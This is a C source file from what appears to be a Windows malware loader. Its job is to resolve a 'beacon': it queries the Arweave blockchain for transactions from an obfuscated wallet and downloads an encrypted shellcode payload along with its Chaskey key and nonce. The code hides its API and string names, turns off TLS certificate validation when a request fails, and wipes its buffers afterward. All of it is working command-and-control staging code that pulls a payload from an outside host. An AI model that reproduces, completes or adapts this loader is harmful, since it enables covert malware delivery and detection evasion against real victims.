// =============================================
// Arweave.c - Beacon Resolver via Arweave Wallet
//
// Decodes the Arweave wallet address from Payload.h (XOR-obfuscated),
// POSTs a GraphQL query to arweave.net/graphql to fetch the last 10
// confirmed transactions FROM that wallet tagged App-Name=ArSync,
// newest first.  For each TX, GETs arweave.net/<txid> and parses the
// combined-format header:
//
//   hex_key|hex_nonce|size|compressed|<binary encrypted payload>
//
// The key, nonce, size, and compression flag are extracted from the ASCII
// header (first bytes up to the 4th '|').  The rest of the downloaded bytes
// IS the encrypted payload — no second HTTP call needed.
//
// Security: `owners` filter = cryptographic sender verification.
//           `tags` filter   = rejects ArDrive/other apps sharing the wallet.
//           `block: {min:1}`= rejects unconfirmed/pending transactions.
//
// Normal flow: 1 GraphQL POST + 1 GET = 2 HTTP calls total.
// Under spam: at most 10 GETs before the retry outer loop fires.
//
// Retries up to NET_RETRY_COUNT times with NET_RETRY_DELAY_MS between
// attempts (Common.h) so the loader survives early-boot network delays or
// a transaction that is still propagating.
// =============================================

#include "Common.h"

typedef PVOID (WINAPI* fnArwInetOpenA)     (LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef PVOID (WINAPI* fnArwInetConnectA)  (PVOID, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, ULONG_PTR);
typedef PVOID (WINAPI* fnArwHttpOpenReqA)  (PVOID, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, ULONG_PTR);
typedef BOOL  (WINAPI* fnArwHttpSendReqA)  (PVOID, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL  (WINAPI* fnArwInetReadFile)  (PVOID, LPVOID, DWORD, LPDWORD);
typedef BOOL  (WINAPI* fnArwInetCloseHnd)  (PVOID);
typedef BOOL  (WINAPI* fnArwInetSetOptA)   (PVOID, DWORD, LPVOID, DWORD);
typedef BOOL  (WINAPI* fnArwInetQueryOptA) (PVOID, DWORD, LPVOID, LPDWORD);

#define ARW_CHUNK_SIZE          8192
#define ARW_INET_SVC_HTTP       3
#define ARW_INET_FLAG_SECURE    0x00800000
#define ARW_INET_FLAG_RELOAD    0x80000000
#define ARW_INET_FLAG_NO_CACHE  0x04000000
#define ARW_INET_FLAG_KEEP_CON  0x00400000
#define ARW_INET_FLAG_IGN_CN    0x00001000
#define ARW_INET_FLAG_IGN_DT    0x00002000
#define ARW_INET_OPT_SEC_FLAGS  31
#define ARW_SEC_IGN_CA          0x00000100
#define ARW_SEC_IGN_CN          0x00001000
#define ARW_SEC_IGN_DATE        0x00002000
#define ARW_SEC_IGN_REVOC       0x00000080

// -----------------------------------------------
// ArwCatStr: append null-terminated s into buf at pos.
// No bounds check — caller ensures capacity.
// Returns new write position.
// -----------------------------------------------
static DWORD ArwCatStr(PCHAR buf, DWORD pos, LPCSTR s) {
    while (*s) buf[pos++] = *s++;
    return pos;
}

static BYTE ArwHexNibble(CHAR c) {
    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (BYTE)(c - 'A' + 10);
    return 0xFF;
}

static BOOL ArwHexDecode(const CHAR* pHex, DWORD hexLen, PBYTE pOut) {
    if (hexLen & 1) return FALSE;
    for (DWORD i = 0; i < hexLen; i += 2) {
        BYTE hi = ArwHexNibble(pHex[i]);
        BYTE lo = ArwHexNibble(pHex[i + 1]);
        if (hi == 0xFF || lo == 0xFF) return FALSE;
        pOut[i >> 1] = (BYTE)((hi << 4) | lo);
    }
    return TRUE;
}

static const CHAR* ArwFindBytes(
    const CHAR* hs, DWORD hsLen,
    const CHAR* needle, DWORD needleLen
) {
    if (!needleLen || needleLen > hsLen) return NULL;
    DWORD limit = hsLen - needleLen;
    for (DWORD i = 0; i <= limit; i++) {
        BOOL ok = TRUE;
        for (DWORD j = 0; j < needleLen; j++) {
            if (hs[i + j] != needle[j]) { ok = FALSE; break; }
        }
        if (ok) return hs + i;
    }
    return NULL;
}

static PBYTE ArwReadResponse(
    fnArwInetReadFile pRead,
    PVOID             hReq,
    PDWORD            pdwSize
) {
    SIZE_T cap = ARW_CHUNK_SIZE * 32;
    PBYTE  buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!buf) return NULL;
    SIZE_T total = 0;
    DWORD  nRead = 0;
    while (1) {
        if (total + ARW_CHUNK_SIZE > cap) {
            cap *= 2;
            PBYTE nb = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
            if (!nb) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
            MemCopy(nb, buf, total);
            HeapFree(GetProcessHeap(), 0, buf);
            buf = nb;
        }
        if (!pRead(hReq, buf + total, ARW_CHUNK_SIZE, &nRead) || nRead == 0) break;
        total += nRead;
    }
    if (total == 0) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    *pdwSize = (DWORD)total;
    return buf;
}

static DWORD ArwParseDecimal(const CHAR* s, DWORD maxLen) {
    DWORD val = 0;
    for (DWORD i = 0; i < maxLen && s[i] >= '0' && s[i] <= '9'; i++)
        val = val * 10 + (DWORD)(s[i] - '0');
    return val;
}

// Returns TRUE if c is a valid Arweave/base64url character [A-Za-z0-9_-].
static BOOL ArwIsBase64UrlChar(CHAR c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '_' || c == '-';
}

// -----------------------------------------------
// ArwDoRequest: send one HTTPS request to szHost:443.
//
// For GET: szHeader=NULL, szBody=NULL, dwBodyLen=0.
// For POST: szHeader = Content-Type header line (with \r\n),
//           szBody   = request body, dwBodyLen = body length.
//
// Returns heap-allocated response on success (caller must HeapFree),
// or NULL on failure.
// -----------------------------------------------
static PBYTE ArwDoRequest(
    fnArwInetOpenA     pOpen,
    fnArwInetConnectA  pConnect,
    fnArwHttpOpenReqA  pHttpOpen,
    fnArwHttpSendReqA  pHttpSend,
    fnArwInetReadFile  pRead,
    fnArwInetCloseHnd  pClose,
    fnArwInetSetOptA   pSetOpt,
    fnArwInetQueryOptA pQueryOpt,
    LPCSTR szHost,
    LPCSTR szMethod,
    LPCSTR szPath,
    LPCSTR szHeader,
    LPCSTR szBody,
    DWORD  dwBodyLen,
    PDWORD pdwRespLen
) {
    LOG("[*] ArwDo: InternetOpenA...");
    BYTE xUA[] = XSTR_USER_AGENT; DEOBF(xUA);
    PVOID hNet = pOpen((LPCSTR)xUA, 0, NULL, NULL, 0);
    MemSet(xUA, 0, sizeof(xUA));
    LOG_HEX("[*] ArwDo: hNet=", (DWORD)(ULONG_PTR)hNet);
    if (!hNet) return NULL;

    LOG("[*] ArwDo: InternetConnectA...");
    PVOID hConn = pConnect(hNet, szHost, 443, NULL, NULL, ARW_INET_SVC_HTTP, 0, 0);
    LOG_HEX("[*] ArwDo: hConn=", (DWORD)(ULONG_PTR)hConn);
    if (!hConn) { pClose(hNet); return NULL; }

    DWORD dwFlags = ARW_INET_FLAG_SECURE  | ARW_INET_FLAG_RELOAD  |
                    ARW_INET_FLAG_NO_CACHE | ARW_INET_FLAG_KEEP_CON |
                    ARW_INET_FLAG_IGN_CN   | ARW_INET_FLAG_IGN_DT;

    LOG("[*] ArwDo: HttpOpenRequestA...");
    PVOID hReq = pHttpOpen(hConn, szMethod, szPath, NULL, NULL, NULL, dwFlags, 0);
    LOG_HEX("[*] ArwDo: hReq=", (DWORD)(ULONG_PTR)hReq);
    if (!hReq) { pClose(hConn); pClose(hNet); return NULL; }

    // dwHeadersLength = -1 means null-terminated; 0 means no headers.
    DWORD dwHdrLen = szHeader ? (DWORD)-1 : 0;
    LOG("[*] ArwDo: HttpSendRequestA...");
    BOOL bSent = pHttpSend(hReq, szHeader, dwHdrLen, (PVOID)szBody, dwBodyLen);
    LOG_HEX("[*] ArwDo: bSent=", (DWORD)bSent);

    if (!bSent && pSetOpt) {
        LOG("[*] ArwDo: retrying with cert bypass...");
        DWORD secFlags = 0, secLen = sizeof(secFlags);
        if (pQueryOpt) pQueryOpt(hReq, ARW_INET_OPT_SEC_FLAGS, &secFlags, &secLen);
        secFlags |= ARW_SEC_IGN_CA | ARW_SEC_IGN_CN | ARW_SEC_IGN_DATE | ARW_SEC_IGN_REVOC;
        pSetOpt(hReq, ARW_INET_OPT_SEC_FLAGS, &secFlags, sizeof(secFlags));
        bSent = pHttpSend(hReq, szHeader, dwHdrLen, (PVOID)szBody, dwBodyLen);
        LOG_HEX("[*] ArwDo: bSent2=", (DWORD)bSent);
    }

    PBYTE pResp = NULL;
    if (bSent) {
        LOG("[*] ArwDo: reading response...");
        pResp = ArwReadResponse(pRead, hReq, pdwRespLen);
        LOG_HEX("[*] ArwDo: respLen=", pdwRespLen ? *pdwRespLen : 0);
    }

    pClose(hReq);
    pClose(hConn);
    pClose(hNet);
    return pResp;
}

// -----------------------------------------------
// ArwParseHeader: parse the combined-format header from a TX response.
//
// Expected format (ASCII header followed by raw binary):
//   <32-hex-key>|<24-hex-nonce>|<decimal-size>|<0|1>|<binary payload...>
//
// The 4th '|' marks the end of the header; everything after it is the
// encrypted payload.  Hex chars [0-9a-f] never contain '|' (0x7C) so
// pipe-counting is unambiguous even when the binary contains 0x7C bytes.
//
// Returns TRUE and fills all out-params on success.
// Zeroes pKey/pNonce and returns FALSE on any parse error.
// -----------------------------------------------
static BOOL ArwParseHeader(
    const BYTE* pBuf,
    DWORD       dwLen,
    PBYTE       pKey,
    PBYTE       pNonce,
    PDWORD      pdwOrigSize,
    PBOOL       pbCompressed,
    PDWORD      pdwDataOff   // byte offset where binary payload begins
) {
    // Header is at most ~72 bytes: 32 + 1 + 24 + 1 + 10 + 1 + 1 + 1 = 71
    // Cap scan at 128 bytes so we never wander into binary data.
    DWORD scanLen = (dwLen < 128) ? dwLen : 128;
    DWORD pipePos[4] = { 0, 0, 0, 0 };
    DWORD pipeCount  = 0;

    for (DWORD i = 0; i < scanLen; i++) {
        if (pBuf[i] == (BYTE)'|') {
            pipePos[pipeCount++] = i;
            if (pipeCount == 4) break;
        }
    }
    if (pipeCount < 4) return FALSE;

    // Field 1: hex_key — bytes [0 .. pipePos[0]-1], must be exactly 32 hex chars
    if (pipePos[0] != 32) return FALSE;
    if (!ArwHexDecode((const CHAR*)pBuf, 32, pKey)) return FALSE;

    // Field 2: hex_nonce — bytes [pipePos[0]+1 .. pipePos[1]-1], must be 24 hex chars
    DWORD nonceStart = pipePos[0] + 1;
    if (pipePos[1] - nonceStart != 24) { MemSet(pKey, 0, KEY_SIZE); return FALSE; }
    if (!ArwHexDecode((const CHAR*)(pBuf + nonceStart), 24, pNonce)) {
        MemSet(pKey, 0, KEY_SIZE); return FALSE;
    }

    // Field 3: orig size — decimal between pipePos[1]+1 and pipePos[2]-1
    DWORD sizeStart = pipePos[1] + 1;
    DWORD sizeLen   = pipePos[2] - sizeStart;
    if (sizeLen == 0 || sizeLen > 12) {
        MemSet(pKey, 0, KEY_SIZE); MemSet(pNonce, 0, 12); return FALSE;
    }
    DWORD origSize = ArwParseDecimal((const CHAR*)(pBuf + sizeStart), sizeLen);
    if (origSize == 0) {
        MemSet(pKey, 0, KEY_SIZE); MemSet(pNonce, 0, 12); return FALSE;
    }

    // Field 4: compressed flag — byte at pipePos[2]+1, must be '0' or '1'
    DWORD compPos = pipePos[2] + 1;
    if (pipePos[3] - compPos != 1) {
        MemSet(pKey, 0, KEY_SIZE); MemSet(pNonce, 0, 12); return FALSE;
    }
    BOOL bComp = (pBuf[compPos] == (BYTE)'1');

    // Binary payload starts immediately after the 4th '|'
    DWORD dataOff = pipePos[3] + 1;
    if (dataOff >= dwLen) {
        MemSet(pKey, 0, KEY_SIZE); MemSet(pNonce, 0, 12); return FALSE;
    }

    *pdwOrigSize   = origSize;
    *pbCompressed  = bComp;
    *pdwDataOff    = dataOff;
    return TRUE;
}

// -----------------------------------------------
// FetchArweaveMeta — public entry point
//
// 1. Decode Arweave wallet address from Payload.h (INIT_ARWEAVE_WALLET)
// 2. POST arweave.net/graphql: owners=[wallet], App-Name=ArSync tag filter,
//    block:{min:1}, first=10, sort=HEIGHT_DESC
//    -> each edge.node.id is a confirmed TX ID sent FROM the wallet
// 3. GET arweave.net/<txid> for each TX ID in order
// 4. Parse the combined-format header from the response:
//      hex_key|hex_nonce|size|compressed|<binary payload>
//    Extract key/nonce/size/compressed; copy binary tail as payload.
//    Stop at first valid result.
//
// Returns TRUE and fills:
//   *ppPayload       heap-allocated encrypted payload bytes (caller HeapFree + wipe)
//   *pdwPayloadLen   length of the encrypted payload in bytes
//   pKey             16-byte Chaskey key
//   pNonce           12-byte Chaskey nonce
//   *pdwOrigSize     uncompressed shellcode size in bytes
//   *pbCompressed    TRUE if LZNT1-compressed before encryption
// -----------------------------------------------
BOOL FetchArweaveMeta(
    IN  PAPI_HASHING pApi,
    OUT PBYTE*       ppPayload,
    OUT PDWORD       pdwPayloadLen,
    OUT PBYTE        pKey,
    OUT PBYTE        pNonce,
    OUT PDWORD       pdwOrigSize,
    OUT PBOOL        pbCompressed
) {
    if (!ppPayload || !pdwPayloadLen || !pKey || !pNonce || !pdwOrigSize || !pbCompressed) return FALSE;
    *ppPayload     = NULL;
    *pdwPayloadLen = 0;
    *pdwOrigSize   = 0;
    *pbCompressed  = FALSE;

    // ---- Resolve WinINet (preloaded in main.c via ShufflePreloadLibraries) ----
    BYTE xWininet[] = XSTR_WININET_DLL; DEOBF(xWininet);
    HMODULE hWinInet = pApi->pLoadLibraryA((LPCSTR)xWininet);
    MemSet(xWininet, 0, sizeof(xWininet));
    if (!hWinInet) return FALSE;

    BYTE xA1[] = XSTR_INTERNET_OPEN_A;         DEOBF(xA1);
    BYTE xA2[] = XSTR_INTERNET_CONNECT_A;      DEOBF(xA2);
    BYTE xA3[] = XSTR_HTTP_OPEN_REQUEST_A;     DEOBF(xA3);
    BYTE xA4[] = XSTR_HTTP_SEND_REQUEST_A;     DEOBF(xA4);
    BYTE xA5[] = XSTR_INTERNET_READ_FILE;      DEOBF(xA5);
    BYTE xA6[] = XSTR_INTERNET_CLOSE_HANDLE;   DEOBF(xA6);
    BYTE xA7[] = XSTR_INTERNET_SET_OPTION_A;   DEOBF(xA7);
    BYTE xA8[] = XSTR_INTERNET_QUERY_OPTION_A; DEOBF(xA8);

    fnArwInetOpenA     pOpen     = (fnArwInetOpenA)    pApi->pGetProcAddress(hWinInet, (LPCSTR)xA1);
    fnArwInetConnectA  pConnect  = (fnArwInetConnectA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA2);
    fnArwHttpOpenReqA  pHttpOpen = (fnArwHttpOpenReqA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA3);
    fnArwHttpSendReqA  pHttpSend = (fnArwHttpSendReqA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA4);
    fnArwInetReadFile  pRead     = (fnArwInetReadFile)  pApi->pGetProcAddress(hWinInet, (LPCSTR)xA5);
    fnArwInetCloseHnd  pClose    = (fnArwInetCloseHnd)  pApi->pGetProcAddress(hWinInet, (LPCSTR)xA6);
    fnArwInetSetOptA   pSetOpt   = (fnArwInetSetOptA)   pApi->pGetProcAddress(hWinInet, (LPCSTR)xA7);
    fnArwInetQueryOptA pQueryOpt = (fnArwInetQueryOptA) pApi->pGetProcAddress(hWinInet, (LPCSTR)xA8);

    MemSet(xA1, 0, sizeof(xA1)); MemSet(xA2, 0, sizeof(xA2));
    MemSet(xA3, 0, sizeof(xA3)); MemSet(xA4, 0, sizeof(xA4));
    MemSet(xA5, 0, sizeof(xA5)); MemSet(xA6, 0, sizeof(xA6));
    MemSet(xA7, 0, sizeof(xA7)); MemSet(xA8, 0, sizeof(xA8));

    if (!pOpen || !pConnect || !pHttpOpen || !pHttpSend || !pRead || !pClose) {
        LOG("[!] Arweave: WinINet func(s) not resolved");
        return FALSE;
    }
    LOG("[*] Arweave: WinINet funcs OK, decoding wallet...");

    // ---- Decode wallet address ----
    // INIT_ARWEAVE_WALLET is a XOR-obfuscated byte array (single-byte key).
    // ARWEAVE_WALLET_LEN includes the null terminator.
    BYTE xWallet[] = INIT_ARWEAVE_WALLET;
    CHAR szWallet[48] = { 0 };
    {
        DWORD wLen = ARWEAVE_WALLET_LEN - 1;
        if (wLen > 47) wLen = 47;
        for (DWORD i = 0; i < wLen; i++)
            szWallet[i] = (CHAR)(xWallet[i] ^ ARWEAVE_WALLET_XOR_KEY);
        szWallet[wLen] = '\0';
    }
    MemSet(xWallet, 0, sizeof(xWallet));

    // ---- Decode runtime strings ----
    BYTE xHost[]    = XSTR_ARWEAVE_HOST;      DEOBF(xHost);
    BYTE xPost[]    = XSTR_HTTP_POST;          DEOBF(xPost);
    BYTE xGet[]     = XSTR_HTTP_GET;           DEOBF(xGet);
    BYTE xGqlPath[] = XSTR_ARWEAVE_GRAPHQL;   DEOBF(xGqlPath);

    // Build Content-Type header for the GraphQL POST ("Content-Type: application/json\r\n")
    BYTE xCT[]        = XSTR_JSON_CONTENT_TYPE; DEOBF(xCT);
    CHAR szCtHdr[48]  = { 0 };
    DWORD hLen = 0;
    hLen = ArwCatStr(szCtHdr, hLen, (LPCSTR)xCT);
    szCtHdr[hLen++] = '\r';
    szCtHdr[hLen++] = '\n';
    szCtHdr[hLen]   = '\0';
    MemSet(xCT, 0, sizeof(xCT));

    // ---- Resolve Sleep for retry delays ----
    typedef VOID (WINAPI* fnSleepFn)(DWORD);
    fnSleepFn pSleep = NULL;
    {
        PVOID hK32 = FindLoadedModuleW(L"KERNEL32.DLL");
        if (hK32) pSleep = (fnSleepFn)FetchExportAddress(hK32, Sleep_JOAAT);
    }

    LOG("[*] Arweave: resolving beacon via wallet...");

    // GraphQL "id" field search key: "id":"  (6 bytes)
    static const CHAR SZ_ID_KEY[] = "\"id\":\"";

    CHAR szGqlBody[256] = { 0 };
    CHAR szTxPath[48]   = { 0 };
    BOOL bFound         = FALSE;

    // ================================================================
    // Outer retry loop
    // ================================================================
    for (DWORD iRetry = 0; iRetry <= NET_RETRY_COUNT && !bFound; iRetry++) {

        if (iRetry > 0) {
            LOG("[*] Arweave: retry...");
            if (pSleep) pSleep(NET_RETRY_DELAY_MS);
        }

        // ================================================================
        // Step 1: POST /graphql — owners=[wallet], first=10, newest first
        //
        // GraphQL JSON body (compact, fits in szGqlBody[256]):
        //   {"query":"{ transactions(owners: [\"<wallet>\"],
        //     first: 10, sort: HEIGHT_DESC,
        //     tags: [{ name: \"App-Name\", values: [\"ArSync\"] }],
        //     block: { min: 1 })
        //     { edges { node { id } } } }"}
        //
        // `owners`  — cryptographic sender filter (Arweave signature)
        // `tags`    — restrict to our uploads; ignores ArDrive/other apps
        //             that may share the same wallet
        // `block`   — only confirmed (mined) TXs; pending TXs have no data
        // ================================================================
        MemSet(szGqlBody, 0, sizeof(szGqlBody));
        {
            DWORD n = 0;
            n = ArwCatStr(szGqlBody, n, "{\"query\":\"{ transactions(owners: [\\\"");
            n = ArwCatStr(szGqlBody, n, szWallet);
            n = ArwCatStr(szGqlBody, n, "\\\"], first: 10, sort: HEIGHT_DESC"
                                        ", tags: [{ name: \\\"App-Name\\\", values: [\\\"ArSync\\\"] }]"
                                        ", block: { min: 1 }) { edges { node { id } } } }\"}");
            szGqlBody[n] = '\0';
        }

        DWORD dwGqlLen = 0;
        PBYTE pGqlResp = NULL;
        LOG("[*] Arweave: entering ArwDoRequest for GraphQL POST");
        __try {
            pGqlResp = ArwDoRequest(
                pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
                (LPCSTR)xHost, (LPCSTR)xPost, (LPCSTR)xGqlPath,
                szCtHdr, szGqlBody, (DWORD)StrLenA(szGqlBody), &dwGqlLen
            );
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            LOG_HEX("[!] Arweave: exception in GraphQL POST, code=", GetExceptionCode());
        }
        MemSet(szGqlBody, 0, sizeof(szGqlBody));
        LOG("[*] Arweave: ArwDoRequest returned");

        if (!pGqlResp) {
            LOG("[!] Arweave: GraphQL POST failed");
            continue;
        }

        // ================================================================
        // Step 2: Scan GraphQL response for TX IDs
        //
        // Response format (minified):
        //   {"data":{"transactions":{"edges":[{"node":{"id":"TX43"}},
        //                                     {"node":{"id":"TX43"}}]}}}
        //
        // Search for "id":"  -> next 43 chars must be base64url -> closing ".
        // Process up to 10 entries, newest first.
        // ================================================================
        const CHAR* pCursor   = (const CHAR*)pGqlResp;
        DWORD       remaining = dwGqlLen;

        for (INT iEntry = 0; iEntry < 10 && !bFound; iEntry++) {

            const CHAR* pIdKey = ArwFindBytes(pCursor, remaining, SZ_ID_KEY, 6);
            if (!pIdKey) break;

            const CHAR* pIdVal = pIdKey + 6;
            DWORD idOff = (DWORD)(pIdVal - pCursor);
            DWORD idRem = (remaining > idOff) ? (remaining - idOff) : 0;

            // Advance cursor past this "id":" marker for the next iteration.
            DWORD skipBase = (DWORD)(pIdKey - pCursor) + 6;

            // Validate: 43 base64url chars then closing "
            BOOL validId = (idRem >= 44);
            if (validId) {
                for (DWORD k = 0; k < 43; k++) {
                    if (!ArwIsBase64UrlChar(pIdVal[k])) { validId = FALSE; break; }
                }
                if (validId && pIdVal[43] != '"') validId = FALSE;
            }

            if (!validId) {
                if (skipBase >= remaining) break;
                pCursor   += skipBase;
                remaining -= skipBase;
                continue;
            }

            // Extract the 43-char TX ID
            CHAR szTxId[48] = { 0 };
            MemCopy(szTxId, pIdVal, 43);
            szTxId[43] = '\0';

            // Build GET path: "/<txid>"
            MemSet(szTxPath, 0, sizeof(szTxPath));
            szTxPath[0] = '/';
            MemCopy(szTxPath + 1, szTxId, 43);
            szTxPath[44] = '\0';
            MemSet(szTxId, 0, sizeof(szTxId));

            // ============================================================
            // Step 3: GET arweave.net/<txid>
            // ============================================================
            DWORD dwDataLen = 0;
            PBYTE pDataResp = NULL;
            __try {
                pDataResp = ArwDoRequest(
                    pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
                    (LPCSTR)xHost, (LPCSTR)xGet, szTxPath,
                    NULL, NULL, 0, &dwDataLen
                );
            } __except(EXCEPTION_EXECUTE_HANDLER) {
                LOG_HEX("[!] Arweave: exception in TX GET, code=", GetExceptionCode());
            }
            MemSet(szTxPath, 0, sizeof(szTxPath));

            if (pDataResp && dwDataLen >= 60) {
                // Step 4: Parse combined header from the TX data
                DWORD dataOff = 0;
                if (ArwParseHeader(pDataResp, dwDataLen,
                        pKey, pNonce, pdwOrigSize, pbCompressed, &dataOff)) {
                    DWORD payLen = dwDataLen - dataOff;
                    if (payLen > 0) {
                        PBYTE pPayload = (PBYTE)HeapAlloc(
                            GetProcessHeap(), HEAP_ZERO_MEMORY, payLen);
                        if (pPayload) {
                            MemCopy(pPayload, pDataResp + dataOff, payLen);
                            *ppPayload     = pPayload;
                            *pdwPayloadLen = payLen;
                            LOG("[+] Arweave: header parsed, payload extracted");
                            bFound = TRUE;
                        }
                    }
                }
            }

            if (pDataResp) HeapFree(GetProcessHeap(), 0, pDataResp);

            // Advance past this TX ID for the next search
            if (!bFound) {
                DWORD skip = skipBase + 43;
                if (skip >= remaining) break;
                pCursor   += skip;
                remaining -= skip;
            }
        }

        HeapFree(GetProcessHeap(), 0, pGqlResp);

        if (!bFound) LOG("[!] Arweave: no valid meta TX found, will retry");
    }

    // Wipe sensitive buffers
    MemSet(szWallet,  0, sizeof(szWallet));
    MemSet(xHost,     0, sizeof(xHost));
    MemSet(xPost,     0, sizeof(xPost));
    MemSet(xGet,      0, sizeof(xGet));
    MemSet(xGqlPath,  0, sizeof(xGqlPath));
    MemSet(szCtHdr,   0, sizeof(szCtHdr));
    MemSet(szGqlBody, 0, sizeof(szGqlBody));
    MemSet(szTxPath,  0, sizeof(szTxPath));

    if (!bFound) {
        LOG("[!] Arweave: beacon resolution failed after all retries");
        return FALSE;
    }

    LOG("[+] Arweave: beacon resolved");
    return TRUE;
}
